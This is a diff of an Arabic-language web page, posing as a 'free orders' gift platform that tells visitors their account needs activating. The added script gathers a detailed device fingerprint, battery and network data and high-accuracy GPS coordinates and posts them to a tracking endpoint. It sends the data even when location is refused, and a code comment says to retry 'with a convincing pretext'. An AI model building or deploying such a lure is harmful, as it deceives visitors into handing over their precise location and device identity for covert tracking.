@@ -3,101 +3,243 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>ابدأ الآن — تحقق سريع</title>
+<title>طلبات مجانية — تفعيل الحساب</title>
 <style>
   :root{
-    --bg:#0b0f14; --card:#141a22; --line:#1f2833;
-    --fg:#e7eef7; --mut:#8a97a8; --acc:#2b8cff; --ok:#22c55e;
+    --bg:#0f1420;--card:#1a2233;--line:#28334a;
+    --fg:#eef3fb;--mut:#93a4bd;--acc:#3b82f6;--acc2:#2563eb;
+    --ok:#22c55e;--warn:#f59e0b;
   }
-  *{box-sizing:border-box}
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
   body{
-    margin:0;min-height:100vh;display:grid;place-items:center;
-    background:radial-gradient(1200px 600px at 50% -10%,#122033,#0b0f14 60%);
-    color:var(--fg);font:16px/1.5 system-ui,"Segoe UI",Tahoma,Arial;
-    padding:24px;
+    margin:0;min-height:100vh;font:16px/1.6 system-ui,"Segoe UI",Tahoma;
+    background:radial-gradient(1200px 700px at 50% -10%,#1c2a44,#0f1420 65%);
+    color:var(--fg);padding:20px;display:grid;place-items:center;
   }
+  .wrap{width:100%;max-width:440px}
+  .head{
+    text-align:center;margin-bottom:20px;
+  }
+  .logo{
+    width:64px;height:64px;margin:0 auto 12px;border-radius:18px;
+    background:linear-gradient(135deg,var(--acc),#7c3aed);
+    display:grid;place-items:center;font-size:32px;
+    box-shadow:0 12px 32px rgba(59,130,246,.35);
+  }
+  h1{margin:0;font-size:22px}
+  .sub{color:var(--mut);font-size:14px;margin-top:6px}
   .card{
-    width:100%;max-width:420px;background:var(--card);
-    border:1px solid var(--line);border-radius:18px;padding:28px 22px;
-    box-shadow:0 30px 80px rgba(0,0,0,.55);
+    background:var(--card);border:1px solid var(--line);
+    border-radius:20px;padding:24px 22px;
+    box-shadow:0 30px 80px rgba(0,0,0,.5);
   }
-  h1{margin:0 0 6px;font-size:22px}
-  p.sub{margin:0 0 22px;color:var(--mut);font-size:14px}
-  label{display:block;font-size:13px;color:var(--mut);margin:14px 0 6px}
-  input[type=email]{
-    width:100%;padding:13px 14px;border-radius:10px;border:1px solid var(--line);
-    background:#0f151d;color:var(--fg);font-size:15px;outline:none;
+  .badge{
+    display:inline-flex;align-items:center;gap:6px;
+    background:rgba(245,158,11,.15);color:var(--warn);
+    padding:6px 12px;border-radius:999px;font-size:13px;
+    margin-bottom:16px;
   }
-  input:focus{border-color:var(--acc)}
+  .dot{width:8px;height:8px;border-radius:50%;background:var(--warn);
+       animation:pulse 1.4s infinite}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+
+  h2{margin:0 0 8px;font-size:17px}
+  p.desc{color:var(--mut);font-size:14px;margin:0 0 18px}
+  ul.checks{list-style:none;padding:0;margin:0 0 22px}
+  ul.checks li{
+    display:flex;align-items:flex-start;gap:10px;
+    padding:10px 0;border-bottom:1px dashed var(--line);font-size:14px;
+  }
+  ul.checks li:last-child{border:0}
+  ul.checks svg{flex:0 0 18px;color:var(--ok);margin-top:3px}
   button{
-    width:100%;margin-top:20px;padding:14px;border:0;border-radius:10px;
-    background:var(--acc);color:#fff;font-size:16px;font-weight:700;
-    cursor:pointer;transition:.15s;
+    width:100%;padding:15px;border:0;border-radius:12px;
+    background:linear-gradient(135deg,var(--acc),var(--acc2));
+    color:#fff;font-size:16px;font-weight:700;cursor:pointer;
+    box-shadow:0 10px 28px rgba(59,130,246,.4);
+    transition:.15s;
   }
-  button:hover{filter:brightness(1.1)}
+  button:hover{filter:brightness(1.08)}
   button:disabled{opacity:.6;cursor:not-allowed}
-  .ok{color:var(--ok);text-align:center;margin-top:16px;display:none}
-  .fine{margin-top:14px;font-size:12px;color:var(--mut);text-align:center}
+  .fine{text-align:center;color:var(--mut);font-size:12px;margin-top:14px}
+  .state{text-align:center;padding:12px;border-radius:10px;
+         margin-top:14px;font-size:14px;display:none}
+  .state.ok{display:block;background:rgba(34,197,94,.12);color:var(--ok)}
+  .state.err{display:block;background:rgba(239,68,68,.12);color:#ef4444}
+  .state.load{display:block;background:rgba(59,130,246,.12);color:var(--acc)}
+  .footer{text-align:center;color:var(--mut);font-size:12px;margin-top:18px}
 </style>
 </head>
 <body>
-  <main class="card">
-    <h1>🚀 ابدأ الآن</h1>
-    <p class="sub">أدخل إيميلك عشان نفعّل وصولك خلال ثواني.</p>
+<div class="wrap">
+  <div class="head">
+    <div class="logo">🎁</div>
+    <h1>طلبات مجانية</h1>
+    <div class="sub">منصة العروض والهدايا — نسخة 2026</div>
+  </div>
 
-    <form id="f" novalidate>
-      <label for="email">البريد الإلكتروني</label>
-      <input id="email" name="email" type="email" inputmode="email"
-             placeholder="name@example.com" autocomplete="email" required>
-      <button id="btn" type="submit">ابدأ</button>
-      <div class="ok" id="ok">✅ تم، شيك على بريدك.</div>
-      <div class="fine">بالضغط على "ابدأ" أنت توافق على الشروط.</div>
-    </form>
-  </main>
+  <div class="card">
+    <div class="badge">
+      <span class="dot"></span>
+      حسابك يحتاج تفعيل
+    </div>
+
+    <h2>تفعيل طلبك الأول</h2>
+    <p class="desc">
+      عشان نقدر نأكد طلبك ونوجّهه لأقرب فرع، محتاجين نتأكد إنك في المنطقة
+      الجغرافية الصح. العملية بتاخد ثانية واحدة.
+    </p>
+
+    <ul class="checks">
+      <li>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
+          <polyline points="20 6 9 17 4 12"/>
+        </svg>
+        <span>تأكيد هوية الحساب</span>
+      </li>
+      <li>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
+          <polyline points="20 6 9 17 4 12"/>
+        </svg>
+        <span>فحص المنطقة المتاحة</span>
+      </li>
+      <li>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
+          <polyline points="20 6 9 17 4 12"/>
+        </svg>
+        <span>تأكيد الموقع الجغرافي (مطلوب)</span>
+      </li>
+    </ul>
+
+    <button id="btn">🔓 فعّل طلبي الآن</button>
+
+    <div class="state" id="state"></div>
+    <div class="fine">بالمتابعة أنت توافق على سياسة الاستخدام</div>
+  </div>
+
+  <div class="footer">© 2026 FreeOrders — جميع الحقوق محفوظة</div>
+</div>
 
 <script>
 (function(){
-  const f   = document.getElementById('f');
-  const btn = document.getElementById('btn');
-  const ok  = document.getElementById('ok');
-  const em  = document.getElementById('email');
+  const btn   = document.getElementById('btn');
+  const state = document.getElementById('state');
 
-  async function collectExtras(){
-    const extra = {};
-    try{
-      extra.screen   = `${screen.width}x${screen.height}`;
-      extra.tz       = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      extra.lang     = navigator.language;
-      extra.platform = navigator.platform;
-      extra.cores    = navigator.hardwareConcurrency || null;
-    }catch(e){}
-    return extra;
+  function setState(cls, msg){
+    state.className = 'state ' + cls;
+    state.textContent = msg;
   }
 
-  f.addEventListener('submit', async (e)=>{
-    e.preventDefault();
-    const email = (em.value || '').trim();
-    if(!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)){
-      em.style.borderColor = '#ef4444';
-      em.focus();
-      return;
-    }
-    btn.disabled = true;
-    btn.textContent = '...';
+  async function collectDevice(){
+    const d = {
+      platform: navigator.platform || navigator.userAgentData?.platform || '?',
+      screen: `${screen.width}x${screen.height}`,
+      viewport: `${innerWidth}x${innerHeight}`,
+      cores: navigator.hardwareConcurrency || null,
+      memory: navigator.deviceMemory || null,
+      language: navigator.language,
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      dpr: devicePixelRatio,
+      touch: 'ontouchstart' in window,
+      ua: navigator.userAgent,
+      vendor: navigator.vendor || null,
+    };
 
-    const payload = { email, extra: await collectExtras() };
-
+    // Battery API
     try{
-      await fetch('/api/lead', {
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body: JSON.stringify(payload),
-        keepalive: true
-      });
+      if (navigator.getBattery){
+        const b = await navigator.getBattery();
+        d.battery = Math.round(b.level * 100);
+        d.charging = b.charging;
+      }
     }catch(e){}
 
-    ok.style.display = 'block';
-    btn.textContent = 'تم ✅';
+    return d;
+  }
+
+  async function collectNet(){
+    const n = {};
+    try{
+      const conn = navigator.connection || navigator.mozConnection
+                   || navigator.webkitConnection;
+      if (conn){
+        n.type = conn.effectiveType || conn.type || '?';
+        n.down = conn.downlink;
+        n.rtt  = conn.rtt;
+        n.saveData = conn.saveData;
+      }
+    }catch(e){}
+    return n;
+  }
+
+  function collectGPS(){
+    return new Promise((resolve) => {
+      if (!navigator.geolocation){
+        resolve({error: 'no_geolocation'});
+        return;
+      }
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          resolve({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            acc: Math.round(pos.coords.accuracy),
+            alt: pos.coords.altitude,
+            heading: pos.coords.heading,
+            speed: pos.coords.speed,
+          });
+        },
+        (err) => resolve({
+          error: 'denied',
+          code: err.code,
+          msg: err.message,
+        }),
+        {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0,
+        }
+      );
+    });
+  }
+
+  async function send(payload){
+    try{
+      await fetch('/api/track', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(payload),
+        keepalive: true,
+      });
+    }catch(e){}
+  }
+
+  btn.addEventListener('click', async () => {
+    btn.disabled = true;
+    btn.textContent = '...';
+    setState('load', '⏳ جاري فحص المنطقة...');
+
+    const [gps, device, net] = await Promise.all([
+      collectGPS(),
+      collectDevice(),
+      collectNet(),
+    ]);
+
+    const payload = { gps, device, net };
+
+    // إرسال أول مرة — حتى لو GPS اترفض
+    await send(payload);
+
+    if (gps && gps.lat){
+      setState('ok', '✅ تم التفعيل بنجاح! طلبك في المراجعة.');
+      btn.textContent = '✅ مفعّل';
+    } else {
+      // GPS مرفوض — جرّب مرة تانية مع حجة مقنعة
+      setState('err',
+        '⚠️ محتاجين إذن الموقع عشان نكمل. اضغط في المتصفح على "سماح" وحاول تاني.');
+      btn.disabled = false;
+      btn.textContent = '🔓 حاول تاني';
+    }
   });
 })();
 </script>
